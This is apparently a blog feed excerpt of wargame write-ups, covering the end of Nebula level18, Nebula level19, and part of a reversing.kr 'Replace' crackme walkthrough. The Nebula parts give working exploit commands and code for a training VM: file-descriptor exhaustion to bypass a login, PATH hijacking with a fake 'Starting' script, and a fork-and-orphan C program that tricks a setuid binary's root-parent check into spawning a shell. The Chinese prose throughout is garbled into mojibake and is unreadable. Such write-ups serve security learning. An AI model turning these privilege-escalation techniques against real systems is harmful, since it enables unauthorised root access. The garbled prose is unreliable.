&lt;p&gt;å¯ä»¥çœ‹åˆ°ï¼Œæ–‡ä»¶å®é™…æ‰“å¼€äº†5ä¸ªæ–‡ä»¶å¥æŸ„ï¼Œé™¤äº†åˆšæ‰è¯´åˆ°çš„ä¸¤ä¸ªï¼Œè¿˜æœ‰æ ‡å‡†è¾“å…¥ã€æ ‡å‡†è¾“å‡ºå’Œé”™è¯¯è¾“å‡ºã€‚ä¹Ÿå°±æ˜¯è¯´å¯¹äºæ–‡ä»¶å¥æŸ„ï¼Œç¨‹åºæœ¬èº«å æœ‰3ä¸ªï¼Œflag18ç¨‹åºå› ä¸ºè°ƒè¯•å æœ‰1ä¸ªï¼Œå‰©ä¸‹çš„1024-3-1=1020æ‰æ˜¯ç»™å¯†ç æ–‡ä»¶çš„ï¼Œä¹Ÿå°±æ˜¯è‡³å°‘1021ä¸ªå¯†ç æ–‡ä»¶çš„æ‰“å¼€æ‰èƒ½&lt;code&gt;fopen()&lt;/code&gt;å¤±æ•ˆã€‚äºæ˜¯æ„é€ å¦‚ä¸‹å‘½ä»¤ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;python -c 'print &amp;quot;login level8\r\n&amp;quot;*1021' | ~flag18/flag18 -d /tmp/dbg17 -vvv
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;æŸ¥çœ‹ä¸€ä¸‹è°ƒè¯•æ–‡ä»¶ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;level18@nebula:/home/flag18$ cat /tmp/dbg17 | tail
got [login level8] as input
attempting to login
got [login level8] as input
attempting to login
got [login level8] as input
attempting to login
got [login level8] as input
attempting to login
logged in successfully (without password file)
got [] as input
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å¯ä»¥å‘ç°å·²ç»ç™»å½•æˆåŠŸäº†ã€‚ä¸‹é¢æˆ‘ä»¬å°±è¦è°ƒç”¨shellå‚æ•°ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;level18@nebula:/home/flag18$ python -c 'print &amp;quot;login level8\r\n&amp;quot;*1021+&amp;quot;shell\r\n&amp;quot;' | ~flag18/flag18 -d /tmp/dbg17 -vvv
/home/flag18/flag18: error while loading shared libraries: libncurses.so.5: cannot open shared object file: Error 24
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;åˆ©ç”¨èµ„æºæé™è¿™ç§æ–¹å¼ï¼Œè™½ç„¶ç»•è¿‡äº†ç™»å½•ï¼Œå´æ²¡æœ‰åŠæ³•å†åˆ›å»ºshellï¼Œä¸è¿‡å¹¸å¥½ç¨‹åºæœ¬èº«ç»™æˆ‘ä»¬æä¾›äº†&lt;code&gt;closelog&lt;/code&gt;ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦åˆ›å»º1021ä¸ªæ–‡ä»¶ç»•è¿‡ç™»å½•ï¼Œä¹‹åå…³é—­1ä¸ªå¥æŸ„ï¼Œå†æ‰“å¼€shellå°±å¯ä»¥äº†ï¼Œäºæ˜¯æ„é€ å¦‚ä¸‹å‘½ä»¤ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;python -c 'print &amp;quot;login level8\r\n&amp;quot;*1021+&amp;quot;closelog\r\nshell\r\n&amp;quot;' | ~flag18/flag18 -d /tmp/dbg17 -vvv
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;æ‰§è¡Œåshellè¿”å›ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;flag18 -d /tmp/dbg17 -vvv
/home/flag18/flag18: -d: invalid option
Usage:  /home/flag18/flag18 [GNU long option] [option] ...
    /home/flag18/flag18 [GNU long option] [option] script-file ...
GNU long options:
    --debug
    --debugger
    --dump-po-strings
    --dump-strings
    --help
    --init-file
    --login
    --noediting
    --noprofile
    --norc
    --posix
    --protected
    --rcfile
    --restricted
    --verbose
    --version
Shell options:
    -irsD or -c command or -O shopt_option      (invocation only)
    -abefhkmnptuvxBCHP or -o option
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;è¿™å…¶å®æ˜¯shæœ¬èº«çš„é—®é¢˜ï¼Œå› ä¸ºå®ƒæŠŠåé¢çš„é‚£äº›å‘½ä»¤ä¹Ÿè®¤ä¸ºæ˜¯å®ƒçš„å‚æ•°äº†ï¼Œè€Œå®ƒæ²¡æœ‰-då‚æ•°ï¼Œæ‰€ä»¥æŠ¥é”™ã€‚è¿™é‡Œç”¨&lt;code&gt;--init-file&lt;/code&gt;å‚æ•°å¯ä»¥è®©å®ƒå¿½ç•¥åé¢çš„å‚æ•°ã€‚é‡æ–°æ„é€ å‘½ä»¤ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;python -c 'print &amp;quot;login level18\r\n&amp;quot;*1021+&amp;quot;closelog\r\nshell\r\n&amp;quot;' | ~flag18/flag18 --init-file -d /tmp/dbg17 -vvv &amp;amp;&amp;gt;/tmp/log17
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;è¿™é‡Œæˆ‘æŠŠæ•´ä¸ªshellä¸­çš„è¾“å‡ºéƒ½æ”¾åˆ°/tmp/log17ä¸­æ˜¯ä¸ºäº†ä¾¿äºæŸ¥çœ‹ï¼Œshellæœ¬èº«çª—å£å¤ªå°äº†ã€‚æŸ¥é˜…log17æ–‡ä»¶å‘ç°ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;/home/flag18/flag18: invalid option -- '-'
/home/flag18/flag18: invalid option -- 'i'
/home/flag18/flag18: invalid option -- 'n'
/home/flag18/flag18: invalid option -- 'i'
/home/flag18/flag18: invalid option -- 't'
/home/flag18/flag18: invalid option -- '-'
/home/flag18/flag18: invalid option -- 'f'
/home/flag18/flag18: invalid option -- 'i'
/home/flag18/flag18: invalid option -- 'l'
/home/flag18/flag18: invalid option -- 'e'
/tmp/dbg17: line 1: Starting: command not found
/tmp/dbg17: line 2: got: command not found
/tmp/dbg17: line 3: attempting: command not found
/tmp/dbg17: line 4: got: command not found
/tmp/dbg17: line 5: attempting: command not found
/tmp/dbg17: line 6: got: command not found
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å¼€å¤´è°ƒç”¨äº†&lt;code&gt;Starting&lt;/code&gt;å’Œ&lt;code&gt;got&lt;/code&gt;å‘½ä»¤ï¼Œä½†æ˜¯ä¸¤ä¸ªå‘½ä»¤éƒ½ä¸å­˜åœ¨ã€‚é‚£å°±æ„é€ ä¸€ä¸ªå‘½ä»¤ï¼Œè¿™æ ·å°±èƒ½åˆ©ç”¨æ¼æ´äº†ï¼ˆ/tmpç›®å½•ä¸‹ï¼‰ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;echo &amp;quot;/bin/getflag&amp;quot; &amp;gt; Starting &amp;amp;&amp;amp; chmod +x Starting
PATH=/tmp:$PATH
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å†æ¬¡æ‰§è¡ŒåæŸ¥çœ‹ç»“æœï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;level18@nebula:/tmp$ cat /tmp/log17 | head -20
/home/flag18/flag18: invalid option -- '-'
/home/flag18/flag18: invalid option -- 'i'
/home/flag18/flag18: invalid option -- 'n'
/home/flag18/flag18: invalid option -- 'i'
/home/flag18/flag18: invalid option -- 't'
/home/flag18/flag18: invalid option -- '-'
/home/flag18/flag18: invalid option -- 'f'
/home/flag18/flag18: invalid option -- 'i'
/home/flag18/flag18: invalid option -- 'l'
/home/flag18/flag18: invalid option -- 'e'
You have successfully executed getflag on a target account
/tmp/dbg17: line 2: got: command not found
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;è¿™æ ·ç¬¬ä¸€ç§æ–¹æ³•å·²ç»å®ç°ã€‚å…¶ä»–æ–¹æ³•å¾…ç»­â€¦â€¦&lt;/p&gt;
&lt;h1&gt;Nebula level19&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;There is a flaw in the below program in how it operates.&lt;/p&gt;
&lt;p&gt;ä¸‹é¢çš„ç¨‹åºæ‰§è¡Œæ–¹å¼æœ‰æ¼æ´ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;sys/stat.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
  pid_t pid;
  char buf[256];
  struct stat statbuf;

  /* Get the parent's /proc entry, so we can verify its user id */

  snprintf(buf, sizeof(buf)-1, &amp;quot;/proc/%d&amp;quot;, getppid());

  /* stat() it */

  if(stat(buf, &amp;amp;statbuf) == -1) {
    printf(&amp;quot;Unable to check parent process\n&amp;quot;);
    exit(EXIT_FAILURE);
  }

  /* check the owner id */

  if(statbuf.st_uid == 0) {
    /* If root started us, it is ok to start the shell */

    execve(&amp;quot;/bin/sh&amp;quot;, argv, envp);
    err(1, &amp;quot;Unable to execve&amp;quot;);
  }

  printf(&amp;quot;You are unauthorized to run this program\n&amp;quot;);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;é¦–å…ˆè¿˜æ˜¯åˆ†æç¨‹åºæ‰§è¡Œæµç¨‹ï¼šç¨‹åºå¯åŠ¨åè°ƒç”¨getppid()å‡½æ•°è·å–çˆ¶è¿›ç¨‹idï¼Œä¹‹åæŸ¥æ‰¾/procä¸‹è¯¥idè¿›ç¨‹æ˜¯å¦å±äºrootï¼Œå¦‚æœæ˜¯rootçš„ï¼Œåˆ™å¯ä»¥æ ¹æ®å‚æ•°æ‰§è¡Œshellå‘½ä»¤ã€‚&lt;/p&gt;
&lt;p&gt;é¦–å…ˆå»/procä¸‹é¢çœ‹çœ‹å“ªäº›è¿›ç¨‹å±äºrootï¼Œæ³¨æ„åˆ°/proc/1ã€‚å›æƒ³ä¸€ä¸‹Linuxè¿›ç¨‹æœºåˆ¶ï¼Œåœ¨çˆ¶è¿›ç¨‹åˆ›å»ºå­è¿›ç¨‹åï¼Œå¦‚æœçˆ¶äº²åœ¨å­è¿›ç¨‹é€€å‡ºå‰å› ä¸ºç§ç§åŸå› ç»“æŸäº†ï¼Œé‚£å­è¿›ç¨‹å°±å½’pid=1çš„initè¿›ç¨‹ç®¡ç†äº†ã€‚è€Œinitæ˜¯å±äºrootï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥è®¾è®¡ä¸€ä¸ªç¨‹åºï¼Œå¯åŠ¨å­è¿›ç¨‹åç«‹é©¬é€€å‡ºï¼Œè¿™æ ·å­è¿›ç¨‹çš„æ–°çˆ¶è¿›ç¨‹å°±æ˜¯initäº†ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
int main(int argc, char *argv[]) {
    pid_t p;
    p = fork();
    if (p == 0) //child
    {
        sleep(1);
        execl(&amp;quot;/home/flag19/flag19&amp;quot;, &amp;quot;/bin/sh&amp;quot;, &amp;quot;-c&amp;quot;, &amp;quot;/bin/getflag &amp;gt; /tmp/flag19.txt&amp;quot;, NULL);
    }
    else if(p &amp;gt; 0) //parent
        exit(0);

    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å…¶ä¸­è®©å­è¿›ç¨‹ç­‰å¾…ä¸€ç§’åè¿è¡ŒæŒ‡ä»¤ï¼Œä¿è¯çˆ¶è¿›ç¨‹é€€å‡ºå¹¶è®©initæ¥ç®¡ã€‚shçš„-cå‚æ•°ç”¨äºå°†è¾“å…¥å‚æ•°ä½œä¸ºæŒ‡ä»¤ä»£æ›¿æ ‡å‡†è¾“å…¥ã€‚&lt;/p&gt;
&lt;p&gt;Voilaï¼å…¨éƒ¨æå®šï¼&lt;/p&gt;
&lt;h1&gt;åè®°&lt;/h1&gt;
&lt;p&gt;å¼€å§‹ç©Nebulaä¹‹åæ— æ³•è‡ªæ‹”ï¼Œå¤©å¤©æ·±é™·å…¶ä¸­ï¼Œå¯èƒ½è¿™å°±æ˜¯æ‰€è°“çš„ç—´è¿·å§ã€‚&lt;/p&gt;
&lt;p&gt;åˆšåšNebulaçš„æ—¶å€™è§‰å¾—çœŸçš„å¥½ç®€å•ï¼Œä»¥ä¸ºä¸‰å››å¤©å°±èƒ½å®Œæˆï¼Œå¾ˆå¯æƒœåˆ°åé¢è¶Šåšè¶Šæ…¢ï¼Œå¾ˆå¤šå‘¨è¾¹çŸ¥è¯†éƒ½æ˜¯è¾¹æŸ¥è¾¹è¡¥å……ï¼Œç¢°åˆ°ä¸æ‡‚å¾—å¯èƒ½å°±å¾—å®Œæ•´çš„ç³»ç»Ÿçš„å­¦ä¹ ï¼Œç”¨äº†ä¸å°‘æ—¶é—´ï¼Œä½†æ˜¯éå¸¸å€¼å¾—ã€‚&lt;/p&gt;
&lt;p&gt;è™½ç„¶ç°åœ¨20é“é¢˜éƒ½å·²ç»å®Œæˆï¼Œä½†æ˜¯æœ‰äº›é¢˜ç›®çš„æ–¹æ³•è¿˜æ¯”è¾ƒå±€é™ï¼Œå¾…æˆ‘å­¦ä¼šé«˜çº§çš„æŠ€å·§åï¼Œä¼šå†å›æ¥è¡¥å……ä¸€äº›æ€è·¯æˆ–æ–¹æ¡ˆã€‚&lt;/p&gt;
&lt;p&gt;å¸Œæœ›è¿™20é“é¢˜çš„Writeupèƒ½ç»™ä½ å¸®åŠ©ã€‚å¦‚æœä½ å·²ç»å®Œæˆï¼Œé‚£å°±å’Œæˆ‘ä¸€èµ·è¿›å†›ä¸‹ä¸€ä¸ªçº§åˆ«çš„æŒ‘æˆ˜ï¼&lt;/p&gt;</summary><category term="exploit-exercises"></category><category term="nebula"></category><category term="wargame"></category><category term="hacking"></category><category term="exploit"></category></entry><entry><title>reversing.kr Replace Walkthrough</title><link href="http://blog.yyx.name/posts/reversing-kr-replace.html" rel="alternate"></link><updated>2014-09-13T20:18:00+08:00</updated><author><name>GreatYYX</name></author><id>tag:blog.yyx.name,2014-09-13:posts/reversing-kr-replace.html</id><summary type="html">&lt;h1&gt;é»‘ç›’å®éªŒ&lt;/h1&gt;
&lt;p&gt;æ‹¿åˆ°ç¨‹åºåè¿è¡Œï¼Œå‡ºç°ä¸€ä¸ªåŒ…å«è¾“å…¥æ¡†å¯¹è¯æ¡†ï¼Œä¸èƒ½è¾“å…¥å­—æ¯å’Œç‰¹æ®Šç¬¦å·ï¼Œåªèƒ½è¾“å…¥0-9è¿™10ä¸ªæ•°å­—ã€‚&lt;/p&gt;
&lt;p&gt;å°è¯•è¾“å…¥æ•°å­—æäº¤åï¼Œç¨‹åºå´©æºƒã€‚è¿ç»­å®éªŒäº†å‡ æ¬¡éƒ½ä¸€æ ·ï¼ŒåŒ…æ‹¬ç•™ç©ºæäº¤ã€‚ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯å…¼å®¹æ€§é—®é¢˜ï¼Œç”¨å…¼å®¹æ¨¡å¼å°è¯•è¿è¡Œï¼Œç»“æœä»ç„¶ä¸€æ ·ã€‚&lt;/p&gt;
&lt;h1&gt;è°ƒè¯•å’Œåˆ†æ&lt;/h1&gt;
&lt;p&gt;é¦–å…ˆæŸ¥å£³ï¼Œæ‹–å…¥PEiDï¼Œ&lt;code&gt;Microsoft Visual C++ 6.0&lt;/code&gt;ï¼Œæ— å£³ã€‚&lt;/p&gt;
&lt;p&gt;æ‹–å…¥ODï¼ŒæŸ¥æ‰¾Nameï¼Œæ ¹æ®åªèƒ½è¾“å…¥æ•°å­—ä¸ºçº¿ç´¢ï¼Œæ‰¾åˆ°&lt;code&gt;GetDlgItemInt&lt;/code&gt;ï¼Œè·Ÿåˆ°ä»£ç ï¼Œä¸‹æ–­ã€‚ç¨‹åºè·‘èµ·æ¥ï¼Œè¾“å…¥ä»»æ„æ•°å­—åå•æ­¥æ­¥è¿‡è¿è¡Œï¼Œé€æ¸ç¼©å°èŒƒå›´ï¼Œå¤šæ¬¡æµ‹è¯•åæ‰¾åˆ°ä½¿ç¨‹åºå´©æºƒçš„åœ°æ–¹â€”â€”&lt;code&gt;call Replace.0040466F&lt;/code&gt;ï¼Œè¿›å»çœ‹ç¨‹åºä»£ç ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;0040466F   $  C600 90                     mov byte ptr ds:[eax],0x90
00404672   ?  C3                          retn
00404673   ?  0081 05D08440               add byte ptr ds:[ecx+0x4084D005],al
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;è¿™æ®µä»£ç åšäº†ä¸€ä»¶å¾ˆå¥½ç©çš„äº‹ï¼šæŠŠ1ä¸ªbyteçš„0x90å¡«å……åˆ°ds:[eax]å¤„ã€‚ds:[eax]è¯´æ˜è¿™ä¸ªå…·ä½“çš„ä½ç½®æ˜¯æ ¹æ®å½“æ—¶eaxå¯„å­˜å™¨çš„å€¼ç¡®å®šçš„ï¼Œ0x90å¦‚æœåœ¨æ•°æ®æ®µå°±æ˜¯ä¸ªä¸å¯æ‰“å°çš„æ•°æ®ï¼Œè€Œåœ¨ä»£ç æ®µåˆ™æ˜¯&lt;code&gt;NOP&lt;/code&gt;æŒ‡ä»¤ã€‚è¿™é‡Œçš„è®¾æƒ³ä¸€å®šè¦å¤§èƒ†ï¼Œå¾ˆå¯èƒ½è¿™æ®µè¯æ˜¯ç”¨æ¥å¡«å……ä»£ç æ®µçš„â€”â€”ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸ºäº†â€œåºŸæ‰â€æŸä¸ªæˆ–è€…æŸæ®µæŒ‡ä»¤ï¼ˆå½“ç„¶&lt;code&gt;NOP&lt;/code&gt;åœ¨Exploitçš„æ—¶å€™å¾ˆå¯èƒ½åšä¸ºæ¨¡ç³Šè·³è½¬æŠ€æœ¯ä¸­çš„ç¼“å†²ï¼‰ã€‚ä¸è¿‡ç›®å‰çŠ¶æ€eaxçš„å€¼ä¸åœ¨dsæŒ‡å‘çš„èŒƒå›´å†…ï¼Œå› æ­¤é€ æˆç¨‹åºå´©æºƒã€‚&lt;/p&gt;
&lt;p&gt;è™½ç„¶ç°åœ¨æ‰¾å‡ºäº†å´©æºƒç‚¹ï¼Œä¸è¿‡è²Œä¼¼æ²¡ä»€ä¹ˆä½œç”¨ï¼Œæˆ‘ä»¬é‡æ–°åŠ è½½ç¨‹åºèµ·æ¥ï¼Œè¾“å…¥123456ï¼Œè¿˜æ˜¯æ–­åœ¨åˆšæ‰çš„åœ°æ–¹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;00401050   .  6A 00         push 0x0                                 ; /IsSigned = FALSE
00401052   .  6A 00         push 0x0                                 ; |pSuccess = NULL
00401054   .  68 EA030000   push 0x3EA                               ; |ControlID = 3EA (1002.)
00401059   .  56            push esi                                 ; |hWnd
0040105A   .  FF15 9C504000 call dword ptr ds:[&amp;lt;&amp;amp;USER32.GetDlgItemIn&amp;gt;; \GetDlgItemInt
00401060   .  A3 D0844000   mov dword ptr ds:[0x4084D0],eax
00401065   .  E8 05360000   call Replace.0040466F
0040106A   .  33C0          xor eax,eax
0040106C   .  E9 1F360000   jmp Replace.00404690
00401071   &amp;gt;  EB 11         jmp XReplace.00401084
00401073   .  68 34 60 40 0&amp;gt;ascii &amp;quot;h4`@&amp;quot;,0                           ;  Correct!
00401078   .  68 E9030000   push 0x3E9                               ; |ControlID = 3E9 (1001.)
0040107D   .  56            push esi                                 ; |hWnd
0040107E   .  FF15 A0504000 call dword ptr ds:[&amp;lt;&amp;amp;USER32.SetDlgItemTe&amp;gt;; \SetDlgItemTextA
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å¤§è‡´çœ‹ä¸€ä¸‹è¿™æ®µä»£ç ï¼Œè·å–è¾“å…¥æ•°æ®åcallä¸€æ¬¡ï¼Œjmp2æ¬¡ä¹‹åå°±åˆ°äº†Correctæç¤ºçš„åœ°æ–¹ã€‚è¿™ä¸ªå¤§è‡´çš„ä»£ç åˆ†å¸ƒè®°åœ¨å¿ƒä¸­ï¼Œç»§ç»­å¾€ä¸‹åˆ†æã€‚&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°åœ¨&lt;code&gt;GetDlgItemInt&lt;/code&gt;åæŠŠå€¼å†™åˆ°äº†ds:[0x4084D0]ï¼Œé•¿åº¦ä¸ºdwordã€‚åœ¨æ•°æ®çª—å£è·³è½¬åˆ°è¿™ä¸ªåœ°å€ï¼ˆå¯ä»¥åœ¨æ•°æ®ä¸Šä¸‹å†…å­˜æ–­ç‚¹åšç›‘æ§ï¼‰ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="no-highlight"&gt;004084D0  40 E2 01 00 00 00 00 00 00 00 00 00 00 00 00     @?.............
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å‘ç°å†™å…¥å€¼ä¸º01E240ï¼ˆå°±æ˜¯16è¿›åˆ¶çš„123456ï¼‰ã€‚è¿™é‡Œæ³¨æ„å‡ ç‚¹ï¼Œç¬¬ä¸€æ˜¯å­˜å‚¨çš„é¡ºåºä¸ºlittle-endianï¼Œç¬¬äºŒæ˜¯å› ä¸ºè¯»å…¥çš„æ˜¯intæ‰€ä»¥é•¿åº¦ä¸ºdwordï¼Œç¬¬ä¸‰ç›´æ¥å­˜å‚¨äº†è¿™ä¸ªæ•°å­—è€Œæ²¡æœ‰è½¬åŒ–æˆå­—ç¬¦ä¸²ã€‚&lt;/p&gt;
&lt;p&gt;ä¹‹åè¿›å…¥ä¸€ä¸ªå‡½æ•°&lt;code&gt;call Replace.0040466F&lt;/code&gt;ï¼Œè·Ÿè¿›å»ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;0040466F   $  E8 06000000   call Replace.0040467A
00404674      81            db 81
00404675   .  05 D0844000   add eax,Replace.004084D0
0040467A   .  C705 16604000&amp;gt;mov dword ptr ds:[0x406016],0x619060EB
00404684   .  E8 00000000   call Replace.00404689
00404689  /$  FF05 D0844000 inc dword ptr ds:[0x4084D0]
0040468F  \.  C3            retn
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å¯ä»¥çœ‹åˆ°&lt;code&gt;0040466F&lt;/code&gt;çš„å‡½æ•°ç”¨callçš„åŠæ³•è·³è½¬åˆ°äº†&lt;code&gt;0040467A&lt;/code&gt;ï¼ˆcallå½“jmpç”¨ï¼‰ï¼Œè¿™æ ·åæ±‡ç¼–å™¨åœ¨åæ±‡ç¼–çš„æ—¶å€™ä¼šä»&lt;code&gt;0040467A&lt;/code&gt;è¿™ä¸ªåœ°å€å¼€å§‹æ±‡ç¼–ï¼Œè€Œè¢«æˆªæ–­å¤„å‰é¢è¿™æ®µæœºå™¨ç ç”±äºæ— æ³•æ„æˆä¸€ä¸ªæˆ–å‡ ä¸ªå®Œæ•´çš„æŒ‡ä»¤ï¼Œå› æ­¤è¢«åæ±‡ç¼–æˆäº†ä¸€ä¸ªæ•°æ®ï¼ˆ&lt;code&gt;db 81&lt;/code&gt;ï¼‰+ä¸€å¥æŒ‡ä»¤ã€‚ä¹‹åç¨‹åºæŠŠ0x619060EBè¿™ä¸ªç«‹å³æ•°å†™å…¥ds:[0x406016]ï¼Œä¼¼ä¹æ²¡ä»€ä¹ˆç”¨ã€‚ä¹‹ååˆé€šè¿‡callæ¥å½“jmpæ¥ç”¨ï¼Œè·³è½¬åˆ°ä¸‹é¢ä¸€å¥è¯ï¼Œåˆšæ‰åœ¨ds:[0x4084D0]ä¿å­˜çš„å€¼è‡ªå¢1ã€‚ä¹‹åretnåˆè·³å›&lt;code&gt;00404689&lt;/code&gt;å†æ‰§è¡Œä¸€éè‡ªå¢ã€‚ä¹‹åå†retnï¼Œæ­¤æ—¶returnåˆ°äº†&lt;code&gt;00404674&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯&lt;code&gt;00404674&lt;/code&gt;æ˜¯&lt;code&gt;db 81&lt;/code&gt;å•Šï¼Œä¸æ˜¯æŒ‡ä»¤ï¼å¯¹ï¼Œè¿™å°±æ˜¯è¿™é¢˜æœ€æœ‰æ„æ€çš„åœ°æ–¹ï¼Œä¸€æ®µæœºå™¨ç ç”¨ä¸åŒçš„æ–¹å¼è§£æï¼Œå¾—åˆ°ä¸åŒçš„è¿è¡Œç»“æœã€‚æ­¤æ—¶éœ€è¦è®©ODé‡æ–°ç†è§£ä¸€ä¸‹è¿™æ®µä»£ç ï¼Œåœ¨&lt;code&gt;00404674&lt;/code&gt;ä¸ŠBackSpaceï¼Œæ­¤æ—¶ï¼Œè¿˜æ˜¯ä¸Šé¢é‚£æ®µæœºå™¨ç ï¼Œä½†åæ±‡ç¼–ä»£ç å˜æˆäº†è¿™æ ·ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;0040466F   $  E8 06000000   call Replace.0040467A
00404674      8105 D0844000&amp;gt;add dword ptr ds:[0x4084D0],0x601605C7
0040467E   ?  40            inc eax
0040467F   ?  00EB          add bl,ch
00404681   ?  60            pushad
00404682   ?  90            nop
00404683   ?  61            popad
00404684   .  E8 00000000   call Replace.00404689
00404689  /$  FF05 D0844000 inc dword ptr ds:[0x4084D0]
0040468F  \.  C3            retn
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;è¿™æ®µä»£ç æŠŠds:[0x4084D0]é‡Œé¢çš„å€¼åŠ äº†0x601605C7ï¼Œä¹‹åè¿™äº›æŒ‡ä»¤ä¼¼ä¹æ²¡ä½œç”¨ï¼Œåˆ°&lt;code&gt;00404689&lt;/code&gt;å®Œæˆè‡ªå¢ï¼Œretnï¼Œå†è‡ªå¢ï¼Œç„¶åè¿™ä¸ªå¥‡æ€ªçš„å‡½æ•°æ€»ç®—è¿”å›äº†ã€‚&lt;/p&gt;
&lt;p&gt;è¿˜è®°å¾—ä¸Šé¢è¯´è¿‡çš„ä¸¤ä¸ªjmpå—ï¼Ÿç°åœ¨è¿›å…¥ç¬¬ä¸€ä¸ªjmpï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;00404690   &amp;gt; \A1 D0844000   mov eax,dword ptr ds:[0x4084D0]
00404695   .  68 9F464000   push Replace.0040469F
0040469A   .  E8 EAFFFFFF   call Replace.00404689
0040469F   .  C705 6F464000&amp;gt;mov dword ptr ds:[0x40466F],0xC39000C6
004046A9   .  E8 C1FFFFFF   call Replace.0040466F
004046AE   .  40            inc eax
004046AF   .  E8 BBFFFFFF   call Replace.0040466F
004046B4   .  C705 6F464000&amp;gt;mov dword ptr ds:[0x40466F],0x6E8
004046BE   .  58            pop eax
004046BF   .  B8 FFFFFFFF   mov eax,-0x1
004046C4   .^ E9 A8C9FFFF   jmp Replace.00401071
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;é¦–å…ˆå–å‡ºds:[0x4084D0]ä¸­çš„å€¼æ”¾å…¥eaxï¼Œä¹‹ååˆè·³åˆ°å‰é¢é‚£ä¸ªds:[0x4084D0]è‡ªå¢çš„åœ°æ–¹ï¼Œè‡ªå¢äº†1æ¬¡ã€‚æ¥ç€æ‰§è¡Œ&lt;code&gt;0040469F&lt;/code&gt;ï¼Œè¿™å¥æŒ‡ä»¤æŠŠ0xC39000C6å†™å…¥ds:[0x40466F]ï¼Œ0x40466Få°±æ˜¯å‰é¢ç¨‹åºå´©æºƒçš„åœ°å€å•Šï¼ä¹Ÿå°±æ˜¯è¯´ï¼Œds:[0x40466F]å¤„æ˜¯ä»£ç ï¼ˆæ•°æ®æ®µå½“ä»£ç æ®µæ‰§è¡Œï¼‰ï¼Œæ‰€ä»¥0xC39000C6å…¶å®æ˜¯å½“åšæŒ‡ä»¤æ¥ä½¿ç”¨çš„ï¼ˆ0xC39000C6å°±æ˜¯è®©ç¨‹åºå´©æºƒçš„é‚£æ®µç¨‹åºçš„æœºå™¨ç ï¼‰ï¼Œæœç„¶ä¹‹åé©¬ä¸Šcalläº†0040466Fã€‚ç„¶åeaxå¢1ï¼Œå†call 0040466Fï¼Œå†æŠŠ0x6E8æ”¾å…¥ds:[0x40466F]ï¼ˆä¾ç„¶æ˜¯å½“åšæŒ‡ä»¤æ‰§è¡Œçš„æ•°æ®ï¼Œæ›¿æ¢å´©æºƒä»£ç ï¼‰ã€‚ä¹‹åå–„åè¿”å›åˆ°&lt;code&gt;00401071&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;è¿™é‡Œå…ˆä¸è¦æ‰§è¡Œï¼Œé¡ºä¸€ä¸‹æ€è·¯ï¼šæ­¤å¤„å–å‡ºds:[0x4084D0]ä¸­çš„å†…å®¹åˆ°eaxåï¼Œæ‰§è¡Œå´©æºƒå‡½æ•°ï¼Œç„¶åeax=eax+1ï¼Œå†æ‰§è¡Œå´©æºƒå‡½æ•°ã€‚è€Œå‰é¢åˆ†æå´©æºƒå‡½æ•°å¯ä»¥ç”¨æ¥æŠ¹å»ä»£ç æ®µä¸­ä¸€ä¸ªbyteï¼Œè¿™é‡Œè°ƒç”¨ä¸¤æ¬¡å°±æ˜¯2byteã€‚å›å»çœ‹è·å–ç”¨æˆ·è¾“å…¥åçš„é‚£æ®µä»£ç ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;...
00401071   &amp;gt;  EB 11         jmp XReplace.00401084
...
&lt;/code&gt;&lt;/pre&gt;

